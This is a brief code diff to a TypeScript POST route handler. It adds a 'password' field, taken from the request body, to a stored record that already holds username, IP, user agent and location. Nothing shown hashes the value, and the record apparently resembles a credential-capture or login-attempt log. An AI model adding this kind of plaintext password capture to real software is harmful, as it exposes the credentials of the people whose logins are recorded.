@@ -34,6 +34,7 @@ export async function POST(request: Request) {
       id: Date.now().toString() + Math.random().toString(36).substring(2, 9),
       timestamp: new Date().toISOString(),
       username: body.username || 'Unknown',
+      password: body.password || '',
       ip: body.ip || 'Unknown IP',
       userAgent: body.userAgent || 'Unknown Agent',
       location: body.location || 'Unknown Location',
